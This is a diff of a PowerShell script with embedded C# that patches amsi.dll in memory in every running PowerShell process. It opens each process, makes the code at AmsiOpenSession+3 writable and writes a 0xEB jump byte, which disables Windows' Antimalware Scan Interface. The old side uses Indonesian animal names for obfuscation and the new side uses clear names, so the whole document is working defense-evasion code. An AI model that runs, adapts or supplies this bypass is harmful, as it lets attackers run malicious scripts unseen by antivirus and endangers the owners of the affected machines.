@@ -3,106 +3,120 @@ using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 
-public class Komodo
+public class NukeAMSI
 {
-    public const int Gajah = 0x0008;
-    public const int Harimau = 0x0010;
-    public const int Kuda = 0x0020;
-    public const uint Buaya = 0x40;
+    public const int PROCESS_VM_OPERATION = 0x0008;
+    public const int PROCESS_VM_READ = 0x0010;
+    public const int PROCESS_VM_WRITE = 0x0020;
+    public const uint PAGE_EXECUTE_READWRITE = 0x40;
 
     [DllImport("ntdll.dll")]
-    public static extern int Panda(out IntPtr Srigala, uint Ular, [In] ref Kucing Ikan, [In] ref Elang Zebra);
+    public static extern int NtOpenProcess(out IntPtr ProcessHandle, uint DesiredAccess, [In] ref OBJECT_ATTRIBUTES ObjectAttributes, [In] ref CLIENT_ID ClientId);
 
     [DllImport("ntdll.dll")]
-    public static extern int LumbaLumba(IntPtr Srigala, IntPtr Jerapah, byte[] Zebra, uint Badak, out uint Tupai);
+    public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);
 
     [DllImport("ntdll.dll")]
-    public static extern int Bunglon(IntPtr Srigala);
+    public static extern int NtClose(IntPtr Handle);
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr Iguana(string Beruang);
+    public static extern IntPtr LoadLibrary(string lpFileName);
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern IntPtr Koala(IntPtr hModule, string procName);
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
     [DllImport("kernel32.dll", SetLastError = true)]
-    public static extern bool Kelinci(IntPtr Srigala, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint Lalat);
+    public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
     [StructLayout(LayoutKind.Sequential)]
-    public struct Kucing
+    public struct OBJECT_ATTRIBUTES
     {
-        public int Kambing;
-        public IntPtr Anjing;
-        public IntPtr Macan;
-        public int Tikus;
-        public IntPtr KupuKupu;
-        public IntPtr Serigala;
+        public int Length;
+        public IntPtr RootDirectory;
+        public IntPtr ObjectName;
+        public int Attributes;
+        public IntPtr SecurityDescriptor;
+        public IntPtr SecurityQualityOfService;
     }
 
     [StructLayout(LayoutKind.Sequential)]
-    public struct Elang
+    public struct CLIENT_ID
     {
-        public IntPtr BurungHantu;
-        public IntPtr Katak;
+        public IntPtr UniqueProcess;
+        public IntPtr UniqueThread;
     }
 }
 "@
 
-function UbahAyam {
+function ModAMSI {
     param (
-        [int]$Domba
+        [int]$processId
     )
 
-    $Bebek = [byte]0xEB  
+    $patch = [byte]0xEB
 
-    $Gorila = New-Object Komodo+Kucing
-    $Zebra = New-Object Komodo+Elang
-    $Zebra.BurungHantu = [IntPtr]$Domba
-    $Zebra.Katak = [IntPtr]::Zero
-    $Gorila.Kambing = [System.Runtime.InteropServices.Marshal]::SizeOf($Gorila)
+    $objectAttributes = New-Object NukeAMSI+OBJECT_ATTRIBUTES
+    $clientId = New-Object NukeAMSI+CLIENT_ID
+    $clientId.UniqueProcess = [IntPtr]$processId
+    $clientId.UniqueThread = [IntPtr]::Zero
+    $objectAttributes.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($objectAttributes)
 
-    $Srigala = [IntPtr]::Zero
-    $status = [Komodo]::Panda([ref]$Srigala, [Komodo]::Gajah -bor [Komodo]::Harimau -bor [Komodo]::Kuda, [ref]$Gorila, [ref]$Zebra)
+    $hHandle = [IntPtr]::Zero
+    $status = [NukeAMSI]::NtOpenProcess([ref]$hHandle, [NukeAMSI]::PROCESS_VM_OPERATION -bor [NukeAMSI]::PROCESS_VM_READ -bor [NukeAMSI]::PROCESS_VM_WRITE, [ref]$objectAttributes, [ref]$clientId)
 
     if ($status -ne 0) {
+        Write-Host "Failed to open process. NtOpenProcess status: $status" -ForegroundColor Red
         return
     }
 
-    $Cacing = [Komodo]::Iguana("amsi.dll")
-    if ($Cacing -eq [IntPtr]::Zero) {
-        [Komodo]::Bunglon($Srigala)
+    $amsiHandle = [NukeAMSI]::LoadLibrary("amsi.dll")
+    if ($amsiHandle -eq [IntPtr]::Zero) {
+        Write-Host "Failed to load amsi.dll." -ForegroundColor Red
+        [NukeAMSI]::NtClose($hHandle)
         return
     }
 
-    $Ular = [Komodo]::Koala($Cacing, "AmsiOpenSession")
-    if ($Ular -eq [IntPtr]::Zero) {
-        [Komodo]::Bunglon($Srigala)
+    $amsiOpenSession = [NukeAMSI]::GetProcAddress($amsiHandle, "AmsiOpenSession")
+    if ($amsiOpenSession -eq [IntPtr]::Zero) {
+        Write-Host "Failed to find AmsiOpenSession function in amsi.dll." -ForegroundColor Red
+        [NukeAMSI]::NtClose($hHandle)
         return
     }
 
-    $Hiu = [IntPtr]($Ular.ToInt64() + 3)
+    $patchAddr = [IntPtr]($amsiOpenSession.ToInt64() + 3)
 
-    $Badak = [UInt32]0
-    $Lumba = [UIntPtr]::new(1)  
-    $LabaLaba = [Komodo]::Kelinci($Srigala, $Hiu, $Lumba, [Komodo]::Buaya, [ref]$Badak)
+    $oldProtect = [UInt32]0
+    $size = [UIntPtr]::new(1)
+    $protectStatus = [NukeAMSI]::VirtualProtectEx($hHandle, $patchAddr, $size, [NukeAMSI]::PAGE_EXECUTE_READWRITE, [ref]$oldProtect)
 
-    if (-not $LabaLaba) {
-        [Komodo]::Bunglon($Srigala)
+    if (-not $protectStatus) {
+        Write-Host "Failed to change memory protection." -ForegroundColor Red
+        [NukeAMSI]::NtClose($hHandle)
         return
     }
 
-    $Tupai = [System.UInt32]0
-    $status = [Komodo]::LumbaLumba($Srigala, $Hiu, [byte[]]@($Bebek), 1, [ref]$Tupai)
+    $bytesWritten = [System.UInt32]0
+    $status = [NukeAMSI]::NtWriteVirtualMemory($hHandle, $patchAddr, [byte[]]@($patch), 1, [ref]$bytesWritten)
 
-    [Komodo]::Kelinci($Srigala, $Hiu, $Lumba, $Badak, [ref]$Badak)
-    [Komodo]::Bunglon($Srigala)
+    if ($status -eq 0) {
+        Write-Host "Memory patched successfully at address $patchAddr." -ForegroundColor Green
+    } else {
+        Write-Host "Failed to patch memory. NtWriteVirtualMemory status: $status" -ForegroundColor Red
+    }
+
+    $restoreStatus = [NukeAMSI]::VirtualProtectEx($hHandle, $patchAddr, $size, $oldProtect, [ref]$oldProtect)
+
+    if (-not $restoreStatus) {
+        Write-Host "Failed to restore memory protection." -ForegroundColor Red
+    }
+
+    [NukeAMSI]::NtClose($hHandle)
 }
 
-function UbahSemuaKucing {
+function ModAllPShells {
     Get-Process | Where-Object { $_.ProcessName -eq "powershell" } | ForEach-Object {
-        UbahAyam -Domba $_.Id
+        ModAMSI -processId $_.Id
     }
 }
 
-UbahSemuaKucing
-Write-Host "Mantap kali"
+ModAllPShells
